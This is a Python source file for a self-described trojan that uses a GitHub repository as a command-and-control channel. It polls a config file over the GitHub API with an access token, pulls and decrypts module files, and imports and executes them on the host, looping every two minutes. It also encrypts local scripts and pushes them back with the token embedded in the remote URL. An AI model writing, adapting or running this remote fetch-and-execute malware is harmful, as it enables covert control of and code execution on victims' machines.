import os
import time
import requests
import base64
import importlib
import importlib.util
from git import Repo
from dotenv import load_dotenv
from cryptography.fernet import Fernet

load_dotenv()


class Trojan:
    def __init__(self):
        self.local_dir = os.getenv("LOCAL_DIR")
        self.username = os.getenv("GIT_USER")
        self.access_token = os.getenv("PAT")
        self.repo = os.getenv("GIT_REPO")

    def run(self):
        self.generate_key()
        while True:
            self.check("config/config.txt")
            self.push_git_repo()
            print("Done")
            time.sleep(120)

    def check(self, file_path):
        url = f"https://api.github.com/repos/{self.username}/{self.repo}/contents/{file_path}?ref=master"
        headers = {"Authorization": f"Bearer {self.access_token}"}
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            decoded_content = base64.b64decode(response.json()["content"]).decode("utf-8")
            words = decoded_content.split()
            if words:
                for word in words:
                    self.import_module(word.capitalize())

    def import_module(self, module_name):
        module_path = os.path.join(self.local_dir, f"scripts/{module_name.lower()}.py")
        try:
            module = importlib.import_module(module_name)
        except ImportError:
            self.pull_git_repo()
            spec = importlib.util.spec_from_file_location(module_name, module_path)
            module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(module)
        self.run_module(module)

    def pull_git_repo(self):
        repo = Repo(self.local_dir)
        origin = repo.remote("origin")
        origin.fetch()
        origin.pull(repo.active_branch.name)
        module_files = repo.git.diff("--name-only", "HEAD@{1}..HEAD", "--", "scripts").split("\n")
        for module_file in module_files:
            if module_file.endswith(".py"):
                module_path = os.path.join(self.local_dir, module_file)
                self.decrypt_module(module_path)

    def push_git_repo(self):
        repo = Repo(self.local_dir)
        repo.git.add("scripts/*.py")
        if repo.is_dirty() or repo.untracked_files:
            module_files = repo.untracked_files + repo.git.diff("--name-only", "--cached").split("\n")
            for module_file in module_files:
                if module_file.endswith(".py"):
                    module_path = os.path.join(self.local_dir, module_file)
                    self.encrypt_module(module_path)
            repo.git.commit("-m", "update trojan")
            origin = repo.remote("origin")
            origin.set_url(f"https://{self.username}:{self.access_token}@github.com/{self.username}/{self.repo}.git")
            origin.push()
        else:
            print("No changes to commit. Skipping push.")

    def run_module(self, module):
        module_class = getattr(module, module.__name__)
        instance = module_class()
        instance.install_requirements()
        instance.run()

    def generate_key(self):
        key = Fernet.generate_key()
        with open('../key/public_key.key', 'wb') as key_file:
            key_file.write(key)

    def encrypt_module(self, module_path):
        with open(module_path, 'rb') as module_file:
            module_content = module_file.read()
        with open('../key/public_key.key', 'rb') as key_file:
            key = key_file.read()
        cipher = Fernet(key)
        encrypted_content = cipher.encrypt(module_content)
        with open(module_path, 'wb') as encrypted_module_file:
            encrypted_module_file.write(encrypted_content)

    def decrypt_module(self, module_path):
        with open(module_path, 'rb') as encrypted_module_file:
            encrypted_content = encrypted_module_file.read()
        with open('../key/public_key.key', 'rb') as key_file:
            key = key_file.read()
        cipher = Fernet(key)
        decrypted_content = cipher.decrypt(encrypted_content)
        with open(module_path, 'wb') as module_file:
            module_file.write(decrypted_content)


def main():
    Trojan().run()


if __name__ == '__main__':
    main()
